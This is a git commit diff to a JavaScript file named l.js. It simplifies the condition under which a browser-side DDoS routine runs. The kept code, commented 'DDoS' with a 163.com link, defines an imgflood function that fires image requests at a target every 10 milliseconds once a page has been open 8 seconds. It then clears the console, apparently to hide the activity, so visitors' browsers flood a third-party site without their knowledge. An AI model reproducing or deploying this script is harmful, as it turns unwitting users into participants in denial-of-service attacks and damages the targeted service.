c2501d10fd1745965e4a08723a396e845498ae96
甜力怕 <63779340+xiaozhu2007@users.noreply.github.com>
2022-12-22 09:36:51 +0800

    Update l.js

--- l.js
+++ l.js
@@ -1,13 +1,4 @@
-if (window.localStorage.getItem("user") != "true") {
-  window.localStorage.setItem("user", "true");
-  window.location.href = "https://xiaozhu2007.netlify.app/";
-  window.localStorage.setItem("bypass", "true");
-}
-
-if (
-  window.localStorage.getItem("user") === "true" &&
-  window.localStorage.getItem("bypass") != "true"
-) {
+if (window.localStorage.getItem("bypass") != "true") {
   // DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
   function imgflood() {
     var TARGET =
@@ -19,7 +10,6 @@ if (
     setInterval(imgflood, 10);
   }, 8000);
 }
-// End
 setTimeout(function () {
     console.clear()
 }, 12000);
